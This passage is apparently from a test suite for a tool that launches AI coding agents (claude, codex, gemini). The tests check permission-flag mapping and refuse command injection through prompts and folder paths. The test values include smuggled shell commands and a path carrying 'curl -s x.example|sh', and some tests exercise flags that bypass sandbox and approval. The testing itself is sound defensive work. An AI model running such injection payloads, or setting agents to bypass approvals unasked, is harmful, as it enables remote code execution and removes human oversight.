  for (const m of ['default', 'manual', 'bogus', 'Default', 'ask', '', undefined]) {
    assert.deepEqual(L.harnessPermissionArgs('claude', m), ['--permission-mode', 'default'], `claude ${m}`);
    assert.deepEqual(L.harnessPermissionArgs('codex', m), [], `codex ${m}`);
    assert.deepEqual(L.harnessPermissionArgs('gemini', m), ['--approval-mode', 'default'], `gemini ${m}`);
  }
  assert.deepEqual(L.harnessPermissionArgs('claude', 'bypassPermissions'), ['--dangerously-skip-permissions']);
  assert.deepEqual(L.harnessPermissionArgs('codex', 'bypassPermissions'), ['--dangerously-bypass-approvals-and-sandbox']);
  assert.deepEqual(L.harnessPermissionArgs('claude', 'acceptEdits'), ['--permission-mode', 'acceptEdits']);
  assert.deepEqual(L.harnessPermissionArgs('claude', 'plan'), ['--permission-mode', 'plan']);
  assert.deepEqual(L.harnessPermissionArgs('claude', 'auto'), ['--permission-mode', 'auto']);
});

test('codex / gemini launch commands (built, not launched)', () => {
  const c = L.buildHarnessCommand({ harness: 'codex', model: 'gpt-5.1-codex', permissionMode: 'bypassPermissions' });
  assert.deepEqual(c.args, ['--dangerously-bypass-approvals-and-sandbox', '-m', 'gpt-5.1-codex']);
  assert.equal(c.promptArg('$PROMPT'), '-- "$PROMPT"');
  assert.deepEqual(L.buildHarnessCommand({ harness: 'codex', permissionMode: 'acceptEdits', resumeId: UUID }).args, ['resume', '--full-auto', UUID]);
  assert.deepEqual(L.buildHarnessCommand({ harness: 'codex', permissionMode: 'manual' }).args, []);
  const g = L.buildHarnessCommand({ harness: 'gemini', permissionMode: 'bypassPermissions' });
  assert.deepEqual(g.args, ['--approval-mode', 'yolo']);
  assert.equal(g.promptArg('$PROMPT'), '"--prompt-interactive=$PROMPT"');
  assert.equal(L.resolveHarness(undefined, `codex-${UUID}`), 'codex');
  assert.equal(L.resolveHarness('claude', `codex-${UUID}`), 'codex', 'a resume id carries its harness');
  assert.equal(L.resolveHarness('nope'), 'claude');
});

test('generated codex script passes a hostile prompt through as one argument', () => {
  const dir = tmp('pl-launch-');
  const out = path.join(dir, 'args.bin');
  const bin = path.join(dir, 'fake-codex');
  fs.writeFileSync(bin, `#!/usr/bin/env bash\nprintf '%s\\0' "$@" > ${JSON.stringify(out)}\n`, { mode: 0o755 });
  const prompt = `-x "; touch ${dir}/pwned; $(touch ${dir}/pwned2) \`id\`\nline 2 'quoted'`;
  const promptFile = path.join(dir, 'p.prompt');
  fs.writeFileSync(promptFile, prompt);
  const script = path.join(dir, 's.sh');
  const { args, promptArg } = L.buildHarnessCommand({ harness: 'codex', permissionMode: 'bypassPermissions', model: 'm1' });
  const text = L.harnessScript({ cwd: dir, name: 'Test', bin, args, promptArg, promptFile, script }).replace('exec bash -l', 'exit 0');
  fs.writeFileSync(script, text, { mode: 0o700 });
  const r = spawnSync('bash', [script], { encoding: 'utf8' });
  assert.equal(r.status, 0, r.stderr);
  const got = fs.readFileSync(out, 'utf8').split('\0').slice(0, -1);
  assert.deepEqual(got, ['--dangerously-bypass-approvals-and-sandbox', '-m', 'm1', '--', prompt]);
  assert.ok(!fs.existsSync(path.join(dir, 'pwned')) && !fs.existsSync(path.join(dir, 'pwned2')));
  assert.ok(!fs.existsSync(promptFile), 'prompt file is removed');
});

test('non-Claude launches: background refused, gemini resume refused (nothing started)', async () => {
  const dir = tmp('pl-cwd-');
  const bg = await L.launch({ cwd: dir, name: 'x', prompt: 'hi', mode: 'background', harness: 'codex' });
  assert.equal(bg.state, 'error');
  assert.match(bg.error, /Claude-only/);
  assert.equal(bg.harness, 'codex');
  const gr = await L.launch({ cwd: dir, name: 'x', mode: 'terminal', harness: 'gemini', resumeId: 'gemini-2025-11-19T15-05-a74d5010' });
  assert.equal(gr.state, 'error');
  assert.match(gr.error, /Gemini/);
  const fork = await L.launch({ cwd: dir, name: 'x', mode: 'terminal', resumeId: `codex-${UUID}`, fork: true });
  assert.equal(fork.harness, 'codex');
  assert.match(fork.error, /Fork is Claude-only/);
});

test('paths with ";" are refused before Windows Terminal is called', async () => {
  const msg = /Folder path contains ";" or .". which Windows Terminal cannot handle safely/;
  const dir = path.join(tmp('pl-semi-'), 'a;b');
  fs.mkdirSync(dir);
  assert.throws(() => L.assertWtSafe('/home/x;calc.exe'), msg);
  assert.doesNotThrow(() => L.assertWtSafe('/home/x/y'));
  // Windows Terminal re-quotes arguments with spaces without escaping inner quotes, and wsl.exe runs what follows
  // `--`: a folder named like this would run a command when a session or shell is opened there.
  assert.throws(() => L.assertWtSafe('/home/x/a" -- curl -s x.example|sh #'), /Windows Terminal cannot handle safely/);
  for (const harness of ['claude', 'codex', 'gemini']) {
    const r = await L.launch({ cwd: dir, name: 'n;ame', prompt: 'hi', mode: 'terminal', harness });
    assert.equal(r.state, 'error', harness);
    assert.match(r.error, msg, harness);
  }
  await assert.rejects(L.openShell(dir, 'T'), msg);
  assert.equal(L.sanitizeName('a;b'), 'ab', 'names never carry ";"');
  assert.equal(fs.readdirSync(paths.launchDir).filter((f) => f.endsWith('.sh')).length, 0, 'no launch script was written');
});
